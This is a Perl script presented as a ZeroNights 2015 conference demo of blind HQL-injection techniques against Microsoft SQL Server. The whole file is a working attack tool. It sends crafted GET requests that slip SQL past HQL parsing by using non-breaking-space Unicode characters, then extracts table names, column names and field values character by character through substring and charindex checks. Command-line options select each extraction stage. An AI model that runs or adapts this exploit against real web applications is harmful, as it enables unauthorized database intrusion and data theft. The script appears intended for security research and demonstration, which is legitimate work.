#!/usr/bin/perl
#
# Different HQLi techiques demo for MSSQL (tested on MS SQL Server Express x64 v. 11.0.2100.60), 
# ZeroNights 2015
#
# Sergey V. Soldatov (github.com/votadlos/), November, 2015
#
# Unicode symbols that pass HQL and treated as PCRE's \s+ in SQL:
# 160:   %C2%A0
# 12288: %E3%80%80
#

use Net::HTTP;
use URI::Encode qw(uri_encode);
use HTTP::Status qw(:constants :is status_message);
#use Encode qw(decode encode);
use Getopt::Std;

###########
# Globals #
###########
$HOST = "192.168.56.102:8080";
$MAX_ID_TO_CHECK = 10; #see $max_id in get_field_by_id
$MAX_COLUMNS = 10; #max columns in table to find
$MAX_COLUMN_NAME_LENGTH = 10; #max column name length
$FIELD_MAX_LEN = 100; #max length of field data
$MAX_TABLE_NAME_LENGTH = 100;


$| = 1;
getopts("Tt:i:f:m:");

###############################################
# Takes table name, name of id field, max id to test and field that you want to get
# returns field data enumerated by id
# 
sub get_field_by_id {
	my ($table, $id, $max_id, $field) = @_;
	my %res = ();
	
	my @TESTS = (qw/. a b c d e f g h i j k l m n o p q r s t u v w x y z 1 2 3 4 5 6 7 8 9 0 _ ./); # alphabet to enumerate letter by letter
	my $SYMB = chr(160); #our unicode symbol
	my $URL = "app/dummy' and substring(SYMB(selectSYMB${field}SYMBfromSYMB${table}SYMBwhereSYMB${id}SYMBlikeSYMBROWNUMBERSYMBandSYMB(SYMB1SYMBlikeSYMB1)),START,1)='TEST";
	my $table_hex = $table;
	$URL =~ s/SYMB/$SYMB/g; #substitute symbol
	for my $row_no (1 .. $max_id){
		my $url = $URL;
		$url =~ s/ROWNUMBER/$row_no/;
		my $field_data = _fuz($url, $FIELD_MAX_LEN,\@TESTS);
		if(length($field_data)>0){
			$res{$row_no} = $field_data;
		}
	}
	return \%res;
}

###############################################
# Use the same technique as get_tables2 getting row by row by filtering out already got rows by uniq field
#
sub get_field_by_uniq {
	my ($table, $field) = @_;
	my @res = ();
	
	my @TESTS = (qw/_ a b c d e f g h i j k l m n o p q r s t u v w x y z 1 2 3 4 5 6 7 8 9 0 . _/);
	my $SYMB = chr(160);
	
	my $URL = "app/dummy' and substring(SYMB(selectSYMBtopSYMB1SYMB${field}SYMBfromSYMB${table}SYMBORDERBY),START,1)='TEST"; #get first row	
	my $URL2 = "app/dummy' and charindex(SYMBcast(SYMB0xTESTSYMBasSYMBvarchar),SYMB(SYMBselectSYMBtopSYMB1SYMB${field}SYMBfromSYMB${table}SYMBwhereSYMB0SYMBlikeSYMBcharindex(SYMBconcat('+',$field,'+'),SYMBcast(SYMB0xFIELDS_FOUNDSYMBasSYMBvarchar(SYMBMAX)))),START) like START and '1'='1";
	
	#1st table - top 1 	
	my $url = $URL;
	$url =~ s/ORDERBY/whereSYMB(SYMB1SYMBlikeSYMB1)/;
	$url =~ s/SYMB/$SYMB/g; #substitute symbol
	my $field_data = _fuz($url, $FIELD_MAX_LEN, \@TESTS);
	push @res, $field_data;
	
	#2nd and others
	my $foundfields = '';
	while($field_data){
		$field_data = '+'.$field_data.'+'; #To work around this problem, when the field_data is a substring of another field_data
		$field_data =~ s/(.)/sprintf("%X",ord($1))/eg; #convert to hex
		$foundfields .= $field_data;
		my $url = $URL2;
		$url =~ s/SYMB/$SYMB/g; #substitute symbol
		$url =~ s/FIELDS_FOUND/$foundfields/;
		$field_data = _fuz($url, $FIELD_MAX_LEN, \@TESTS, 1);
		if ($field_data){
			push @res, $field_data;
		}
	}
	return \@res;
}

###############################################
# Takes name of the table and returns its columns via HQL injection of demo app
#
sub get_columns {
	my $table = shift;
	my %res = ();
	
	my @TESTS = (qw/. a b c d e f g h i j k l m n o p q r s t u v w x y z 1 2 3 4 5 6 7 8 9 0 _ ./);
	my $SYMB = chr(160);
	my $URL = "app/dummy' and substring(SYMB(selectSYMBcolumn_nameSYMBfromSYMBinformation_schema.columnsSYMBwhereSYMBordinal_positionSYMBlikeSYMBPOSITIONSYMBandSYMBtable_nameSYMBlikeSYMBcast(SYMB0xHEXTABLENAMESYMBasSYMBvarchar)),START,1)='TEST";
	my $table_hex = $table;
	$table_hex =~ s/(.)/sprintf("%X",ord($1))/eg; #convert to hex
	$URL =~ s/HEXTABLENAME/$table_hex/; #substituute table name
	$URL =~ s/SYMB/$SYMB/g; #substitute symbol
	for my $column_no (1 .. $MAX_COLUMNS){
		my $url = $URL;
		$url =~ s/POSITION/$column_no/;
		my $column_name = _fuz($url, $MAX_COLUMN_NAME_LENGTH,\@TESTS);
		if(length($column_name)>0){
			$res{$column_no} = $column_name;
		}
		else {
			last;
		}
	}
	return \%res;
}

###############################################
# Takes nothing and returns names of 2 tables via HQL injection
#
sub get_tables {
	my %res = ();
	
	my @TESTS = (qw/_ a b c d e f g h i j k l m n o p q r s t u v w x y z 1 2 3 4 5 6 7 8 9 0 _/);
	my $SYMB = chr(160);
	my $URL = "app/dummy' and substring(SYMB(selectSYMBtopSYMB1SYMBtable_nameSYMBfromSYMBinformation_schema.tablesSYMBORDERBY),START,1)='TEST";
	
	
	#1st table - top 1 	
	my $url = $URL;
	$url =~ s/ORDERBY/whereSYMB(SYMB1SYMBlikeSYMB1)/;
	$url =~ s/SYMB/$SYMB/g; #substitute symbol
	my $table_name = _fuz($url, $MAX_TABLE_NAME_LENGTH, \@TESTS);
	$res{$table_name}++;
	#print "First table done!\n"; #DEBUG
	
	#2nd table - top 1 with filtered (not like) just found
	my $url = $URL;
	$table_name =~ s/(.)/sprintf("%X",ord($1))/eg; #convert to hex
	$url =~ s/ORDERBY/whereSYMBtable_nameSYMBnotSYMBlikeSYMBcast(SYMB0x${table_name}SYMBasSYMBvarchar)/;
	$url =~ s/SYMB/$SYMB/g; #substitute symbol
	$table_name = _fuz($url, $MAX_TABLE_NAME_LENGTH, \@TESTS);
	$res{$table_name}++;
	
	return \%res;
}

###############################################
# Use more 'advanced' techinque than get_tables and returns all tables in current DB via injection
#
sub get_tables2 {
	my %res = ();
	
	my @TESTS = (qw/_ a b c d e f g h i j k l m n o p q r s t u v w x y z 1 2 3 4 5 6 7 8 9 0 _/);
	my $SYMB = chr(160);
	
	my $URL = "app/dummy' and substring(SYMB(selectSYMBtopSYMB1SYMBtable_nameSYMBfromSYMBinformation_schema.tablesSYMBORDERBY),START,1)='TEST";
	
	my $URL2 = "app/dummy' and START like charindex(SYMBcast(SYMB0xTESTSYMBasSYMBvarchar),SYMB(SYMBselectSYMBtopSYMB1SYMBtable_nameSYMBfromSYMBinformation_schema.tablesSYMBwhereSYMB0SYMBlikeSYMBcharindex(concat('+',table_name,'+'),SYMBcast(SYMB0xTABLES_FOUNDSYMBasSYMBvarchar(SYMBMAX)))),START) and '1'='1";
	
	#1st table - top 1 	
	my $url = $URL;
	$url =~ s/ORDERBY/whereSYMB(SYMB1SYMBlikeSYMB1)/;
	$url =~ s/SYMB/$SYMB/g; #substitute symbol
	my $table_name = _fuz($url, $MAX_TABLE_NAME_LENGTH, \@TESTS);
	$res{$table_name}++;
	#print "First table done!\n"; #DEBUG
	
	#2nd and others
	
	my $foundtables = '';
	while($table_name){
		$table_name = '+'.$table_name.'+'; #To work around this problem, when the table name is a substring of another table name
		$table_name =~ s/(.)/sprintf("%X",ord($1))/eg; #convert to hex
		$foundtables .= $table_name;
		my $url = $URL2;
		$url =~ s/SYMB/$SYMB/g; #substitute symbol
		$url =~ s/TABLES_FOUND/$foundtables/;
		$table_name = _fuz($url, $MAX_TABLE_NAME_LENGTH, \@TESTS, 1);
		if ($table_name){
			$res{$table_name}++;
		}
	}
	return \%res;
}

###############################################
# Enumerate word symbol by symbol via SQL injection
#
sub _fuz {
	my($URL, $max_len, $a, $to_hex) = @_;
	
	my $res = ''; #result
	
	for my $start (1 .. $max_len){
		my $flag = 0;
		for my $test (@{$a}){
			my $url = $URL;
			
			if($to_hex){
				my ($test2, $cur_len) = ($test, $start); 
				$test2 =~ s/(.)/sprintf("%X",ord($1))/eg;
				$url =~ s/START/$cur_len/g;
				$url =~ s/TEST/$test2/;
			}
			else {
				$url =~ s/START/$start/;
				$url =~ s/TEST/$test/;
			}
			$url = uri_encode($url);
			#print "url = '$url'\n"; #DEBUG
			
			my $ses = Net::HTTP->new(PeerAddr => $HOST);
			$ses->keep_alive(0);
			$ses->write_request(GET => "/$url", 'User-Agent' => "Mozilla/5.0");
			my($code, $mess, %h) = $ses->read_response_headers(laxed => 1 );
			#print "$start-$test: $code, $mess\n"; #DEBUG
			$flag++;
				
			my $buf;
			my $n = $ses->read_entity_body($buf, 2048);
			if($n > 2 && $code == 200){ #more than empty json
				print $test; #DEBUG
				$res .= $test;
				last;
			}
		}
		if ($flag == @{$a}){ #tested all alphabet and didn't find match => finish
			last;
		}
	}
	print "\n"; #DEBUG
	return $res;
}

###########
# M A I N #
###########
if($opt_T){ #get tables
	my $r = get_tables2();
	print "[+] Found tables: ".join(', ', map {"'$_'"} sort keys %{$r})."\n";
}
# get fields data enumerating by id
elsif($opt_t && $opt_i && $opt_f){
	my $max_id = $opt_m || $MAX_ID_TO_CHECK;
	my $r = get_field_by_id($opt_t,$opt_i,$max_id,$opt_f);
	print "[+] Table '$opt_t':\n[+] $opt_i\t$opt_f\n";
	for (sort keys %{$r}){
		print "[+] $_\t".$r->{$_}."\n";
	}
}
# get fields data one by one filtering out that was alread got
elsif($opt_t && $opt_f){
	my $r = get_field_by_uniq($opt_t,$opt_f);
	print "[+] Table '$opt_t':\n[+] $opt_f\n";
	map {print "[+] $_\n"} @{$r};
}
elsif($opt_t){ #get table colums
	my $r = get_columns($opt_t);
	print "[+] Table '$opt_t' has columns: ".join(', ', map {"'".$r->{$_}."'"} sort keys %{$r})."\n";
}
else {
	print "$0 [opts]\n\t-T - get tables\n\t-t table_name - table name which columns you like to get\n"
		."\t-i id_name - name of index field\n\t-m num - max Id to test, 10 - default\n\t-f field_name - field name which data to get\n";
}
